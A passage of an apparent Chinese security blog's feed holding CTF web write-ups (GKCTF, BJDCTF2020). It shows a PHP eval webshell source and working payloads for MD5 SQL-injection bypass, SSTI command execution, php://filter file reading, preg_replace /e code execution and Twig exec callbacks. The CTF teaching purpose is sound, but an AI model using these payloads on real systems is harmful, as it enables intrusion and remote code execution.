&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip3 install pyro4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;有python但是没有pip的例如mac os，执行下面的命令即可安装对应python版本的pip&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;wget https://bootstrap.pypa.io/get-pip.py&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo python get-pip.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="移动端测试" scheme="https://sunny250.github.io/categories/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="工具使用" scheme="https://sunny250.github.io/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
      <category term="frida" scheme="https://sunny250.github.io/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF2019-web</title>
    <link href="https://sunny250.github.io/2020/05/26/GKCTF2019-web/"/>
    <id>https://sunny250.github.io/2020/05/26/GKCTF2019-web/</id>
    <published>2020-05-26T12:09:17.000Z</published>
    <updated>2020-05-26T12:09:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><p>打开题目就有源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;GKCTF2020-CheckIN&quot;&gt;&lt;a href=&quot;#GKCTF2020-CheckIN&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="日常刷题" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="GKCTF" scheme="https://sunny250.github.io/tags/GKCTF/"/>
    
  </entry>
  
  <entry>
    <title>长亭科技面经</title>
    <link href="https://sunny250.github.io/2020/05/19/%E9%95%BF%E4%BA%AD%E7%A7%91%E6%8A%80%E9%9D%A2%E7%BB%8F/"/>
    <id>https://sunny250.github.io/2020/05/19/%E9%95%BF%E4%BA%AD%E7%A7%91%E6%8A%80%E9%9D%A2%E7%BB%8F/</id>
    <published>2020-05-19T13:13:28.000Z</published>
    <updated>2020-05-19T13:13:28.000Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">U2FsdGVkX1+6WhwBvSz0e4VVe5iaFNDYBuofOZnErVIR98sf9Y6n7XuqAjqsRJGnv5WOPhT0UnRf4Ni3UqH5wI5kub0xzJxPUuoHp+aiFg/sIeAMzludzYJFjBXMfNR930lGBRXm7mmAjkrBH8gtOkW0aXTFphDr6CZMc+EDP5KkBXuNAF5KCvFhOZfvsf8ofQXt/9A0S7a6+ewZ+RrUO/HHHFtFcqMKRjyw3qnnW7XuS9ih5xRm1Ns023zTjWMnZ+I2JawfZhAUeThbcASI29vwGfkQkaoJiST8bU4NjMLbfYEIgcYLPF2iJHj7cmO0zJ/QfDIUlZDV5Vyi6fYOmKBLTWHQ4Vh6gz/EDxBrzObL2IJ2noZNYkCe+3GUWYIHmUKmhh97Mm9sYoI2yCDOCLx3qTn35NyMe+6gMweuh6Yf1UQuVwX3axjyqQavfVcwHU/tcNa+f1nW/TU34Ingi4CcOYNk7XgTUHqaesqoGYVpF8vQh0TJtXnTD1et/5igfvemewUv0yYpiG3WoShrkJeWY7ebyUzc1glypVjHngmYSD5GDZ62rAK1KtMp9IVulvPu7cqlw/xEq1ldIpUG7WNGAur89E20R69fHvd5H3cSaLU0fJes8sa67VKSM2TvtV4aPkkJkon1kiQnpBIDK0PQsENwvnvVqCOxDKwC/rD7pYhpEYe8abga8JvemGlZS1gYY533slEZRtRhu/9sLttaetCBHUf5zcafNq6OiraOvQ4cBqHO98Jc3L86yMFGXIqggb3JHn641SwaZlA33gk2JHnXK2OlMlSAkjacw9zu7tmH9VvA6pdNa2N9KeCF75He0JQKOoXNzC8tL6Ry0FO+ZWO39Z4pHWqpTQ27XNT04DoWekzYBGWAv6fGCcgUNdAAHIwM9c27DYERQBEXX7lbNBk4bCcgATVwbAKWwppOUCHotcnsSzRs11MBT9gfA2YOksA3sHtHWheO7jF8stQdrE1V+CK+9kaKt+doTa/oJ0YVhXQydPkEtz1NGtA89c9sGCMiTCWyyGzCPGjgZaSV7OYEdsrKLGq4hVPMB2AThK/QLbFO0Jz00e6BnIQcENt6uvD+J5SSWxkmg+8AWcpr/0sn+qAbeihZcLR0I1/YZDN7fxAdJtXnIDUFhAIzRvL+kLXESJbtTVy7DMbIIlHKPzytulYL94aB9sfHc5RoAjIyW1KIKnKjPxO3vTBhwm7oo0Ev5n8fAG1TxnLTSh7PfFV7PmQbIrDwalrV7iIHLOgK8uX6S2iA4Y+5DEdX04/AeOOGRyR+eQyd+gAwJgi8Yp28Z76bsVIZ1DZ6ismrCyBEMJLRXKrfRcD33BB000aIDqSD3mNFniqtejQKjmVzzbnae0oPv+d7rS8ZBaRoiG0HiTERuz18NkHgcqUOZMdCJMVg8unDlY5ACccfifCx8GJXisNnCe5WNiTrs39x+Lbar7AMAUze+GEBKaMa82mdG7usfLFlrGlUivRhb3BmJGZ8sMNJmrUfRGbQVMX++pvPw6qI7s5kBZwjHX4owBPITE3IFfFg4lgHU5LK34MJSAcW7EWkUGxjdH5wb8smhy/62Z1Apx9D7h47QkxnJ59QMtmHH3KiCxK2TBHDGMquKiu7XF9fUXm8/07wU1qvAm78p+A21d0mIFyV49xaI+Qzw2+aslhfi3rDmlfT1shmN4IXqWyaf2r4Cgt9ZRnXfBseeLKUPCLMd9BKhs8519+Osn8kfdAPQwsnLX8gQxs6n8hhQmFnP8P1+IQmG5IP2wkMhtoO4zXZUlCP7T0ENPDIoK67gP/3uBYfb1BBe9apKjo9mATx//wVvWWJElO0Goy2NnezrTte/JzWdANu0Z78wZJ+1LHoN2mmuyeuuNLlavV9md25k+mOXy8UfLsDUZ7aSstDLfJ92JC7KkINpP2i39fPGl66NkxIhr91x7QDioW9IDiY30jaxXCq7Sj2klTic1WkO2VTfHUKjovDCpAGttClLEuC2w0SIFOjZaxrwqf3//Z02T5ybYPMa0u3ZxXSw2JKhWVGY45vIwUtz8AwrxOmWGvaN/kd1u58XXBmF3V3FRPkzmkNJgsFmnNPG+/gtGBGhxnlWrVXt13VfJ7R390sFIna/PF4XepLld6IyMJSZAJjRMInSuhSAHVrXxZ89tIKEmoiHX0+eL0/4nSlPYyNccFjRIyDy3g5iz2h0HL6VhjY9KLPRaw71Aqp9gKkjWgG2sQ2kEEI8hgOus9JzkWLdgti0cvQfup4u+nnfpWQQ0gOxhsUeJeBMxV8suBrx/mQ5C9FsXdTi1U/smRmF6Qr6hHoqxEB3nXn2O2f18uk87iAgMlXqizkegoE2WK9W9lVZYBc4a56eSzV99+Kctnm6S3fZzzXoLESltjpvO4HDNw5HvLpGqCwecT0a/IFmqDsUa0YgJ7jJ8ZBmSFMR6A6/MhC1bIXFNVWlPVM5RjfxTe0/rUGwJaxnZZOyOVhKosg5pcBfwF+z5yFkg7pQ8NdyYa4L0rtJpAnNulQKPbzbK4deQQLrM9xqaOO+w1mh/lLx5s1CtZqSL20ZYX1DBXrWEqvRL+qA2s1t+NO0XnRdvdz8WKID4OR/yL8MvY3ZsUaErXGgx+E0uCfk1L+8jpI6Kl0HfP3WhruYbv8Vdm0NWoZm6qN+Kg2MQD0AcxjGF3kpZXyQcy6DC9/wnlx/JU3hoCuig0JibLb23Lwkc6xteWMP96IuakqAsZrK8PK2VvsrbPBcbP5leSLe5Sg649IPTzCaa9HwUad2TlqBFLP+kjHkoSqrtuZWfdoYVMeTz2LwP0ux4nK8NQYqH+KGPJdluGPZ35UAupgwotBzG8gm9D7tAccxgkBZHIQu7UboxLzBVgO1CEzfAj0Ob4gTmdSw5xx1hAPY8tWlbQIFWZS4pfpKbVPDrCUd+lu/bb62Ml5k2EZdhGAu+hU2ukV2tkVpGIGN2CbfrR0X3nXn+AgbXhyTmhZ490obw5l6+hGsFBuSwsjOL8K6lgj9mIgChfYRr8dcvNkgj0iXA8vN6fOKL9hjzFH+c/c1LTsR9sMTso4mrHPKYylaOyuEXNGdkjhyxpC+U1HVSmiJRpw9wvgQ4jIEKmnTQslphFxg4naVi1LS4b0XqJALWGWmnPvOdmqlbIOBizHMC9e+RuNlAMdTVWrJKR+5OQ6ujQOHuwZvkcUXKPT4Jm+8ifxdaB/hGcQxDz5tK0USb8Rs+4QV0gcKyuKgtl8uWLRraBRtlkz/+AI+cjGW02+AilwjQJRrIXV4y8p8nTQ7GYojTtvOV1eFjzC249XGMnPrtbVhWQlF5Q+eC4qOFdxGAjN/5G0Wr0GWIGQ2PMXNAoLUFCelLFSwa51W2AXR5BuQvQE+KsX9YlTHEzNjuA+Ey894pAkIKnNAzmPNFeH6+d/LCd4ELBirjveGk4aNhyIQ9ul7OwqN9mARSkA71Asv8Seq2XoeIsNeJpk/V1W6kmSNmSaGaXPyrDjWmx4tgB6mEA2HQoC7bgcvwmBnk/+RbjD</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=/js/crypto-js.js&gt;&lt;/script&gt;
&lt;script&gt;
function doDecrypt (pwd, onError) {
	console.log(&#39;in doDecrypt&#39;);
	const txt = document.getE
      
    
    </summary>
    
    
      <category term="日常" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
  </entry>
  
  <entry>
    <title>BJDCTF2020刷题记录</title>
    <link href="https://sunny250.github.io/2020/05/13/BJDCTF2020%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://sunny250.github.io/2020/05/13/BJDCTF2020%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-05-13T02:25:34.000Z</published>
    <updated>2020-05-13T02:25:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h2><p>在题目返回的http header中给出了提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br></pre></td></tr></table></figure><p>要使得某个字符串的md5值转字符串后出现形如 <code>&#39;or&#39;1</code></p><a id="more"></a><p>自己懒得跑了直接百度一个  来自<a href="https://blog.csdn.net/qq_24810241/article/details/79908449" target="_blank" rel="noopener">https://blog.csdn.net/qq_24810241/article/details/79908449</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">md5(ffifdyop,32) &#x3D; 276f722736c95d99e921722cf9ed621c</span><br><span class="line">转成字符串为&#39;or&#39;6�]��!r,��b</span><br></pre></td></tr></table></figure><p>填入之后跳转到另一个界面，查看源码给出了提示</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$a = $GET['a'];</span></span><br><span class="line"><span class="comment">$b = $_GET['b'];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span></span><br><span class="line"><span class="comment">    // wow, glzjin wants a girl friend.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>传入数组绕过 <code>?a[]=0&amp;b[]=1</code></p><p>来到第三个页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样可以使用数组绕过，也可以使用相同md5生成器<a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip" target="_blank" rel="noopener">fastcoll</a>生成两个相等md5，但是原始字符串不同</p><h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><p>扫描目录后发现存在git泄露</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;.git&#x2F;</span><br><span class="line">+ http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;flag.php (CODE:200|SIZE:0)</span><br><span class="line">+ http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;.git&#x2F;index (CODE:200|SIZE:5725)</span><br><span class="line">+ http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;.git&#x2F;config (CODE:200|SIZE:137)</span><br><span class="line">+ http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;.git&#x2F; (CODE:403|SIZE:555)</span><br></pre></td></tr></table></figure><p>使用githack获取源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取到的index.php的部分关键代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;   <span class="comment">//$x=pkey $y=pvalue</span></span><br><span class="line">    $$x = $y;    <span class="comment">//$$x=$pkey = $y=pvalue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;   <span class="comment">//$x=gkey $y=gvalue</span></span><br><span class="line">    $$x = $$y;   $$flag=$$y=<span class="number">1</span>     <span class="comment">//$$x=$gkey = $gvalue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;   <span class="comment">//$x = gkey $y = $gvalue</span></span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;   </span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure><p>这个题目考点就是源码阅读,疯狂套娃。如上分析，POST传入的参数如果是flag，结过就是<code>$flag=pvalue</code>将导致<code>$flag</code>被覆盖。</p><p>如果POST传入的参数不能为flag，就在第二个判断条件终止。就要使得<code>$yds=$flag</code></p><p>在第二个foreach中恰好满足条件，GET传入yds=flag,然后就是不执行第一个判断语句。如果未传入参数，if就不会执行。</p><h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>打开题目是一个精美的界面</p><p><img src="/pic/160.png" alt=""></p><p>上面有一个flag.php，给出了ip地址，结合题目标题。添加一个X-Forwarded-For头部</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;7*7&#125;</span><br></pre></td></tr></table></figure><p>页面变成了IP:49</p><p><img src="/pic/161.png" alt=""></p><p>是ssti没错了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入&#123;phpinfo()&#125;成功执行</span><br><span class="line"></span><br><span class="line">&#123;system(&quot;cat &#x2F;flag&quot;)&#125;  即可拿到flag</span><br></pre></td></tr></table></figure><h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><p>给出了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要让$text变成文件类型，使用为data协议或者远程文件包含,提示next.php文件，使用为协议读取文件源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I%20have%20a%20dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//next.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看见正则匹配函数有<code>/e</code>选项，可以命令执行 <a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">参考文章</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;assert(system(&quot;cat%20&#x2F;flag&quot;));</span><br></pre></td></tr></table></figure><h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>还是和之前The mystery of ip一样的界面。flag界面变成了输入username</p><p><img src="/pic/163.png" alt=""></p><p>测试xss，sql注入，均无果。猜测可能还是ssti</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入&#123;7*7&#125;，无果再次测试&#123;&#123;7*7&#125;&#125;，发现返回了49,继续测试&#123;&#123;7*&#39;7&#39;&#125;&#125;，返回49</span><br></pre></td></tr></table></figure><p>附上测试流程</p><p><img src="/pic/162.png" alt=""></p><p>应该是twig</p><p>找payload，在<a href="https://www.cnblogs.com/cioi/" target="_blank" rel="noopener">Cxlover师傅的博客</a>找到了payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;falg&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>扫描目录发现备份文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;69d43586-fb6a-4cce-9174-915b9b1788e5.node3.buuoj.cn&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;69d43586-fb6a-4cce-9174-915b9b1788e5.node3.buuoj.cn&#x2F;index.php.swp (CODE:200|SIZE:1153)</span><br><span class="line">+ http:&#x2F;&#x2F;69d43586-fb6a-4cce-9174-915b9b1788e5.node3.buuoj.cn&#x2F;index.php (CODE:200|SIZE:1048)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 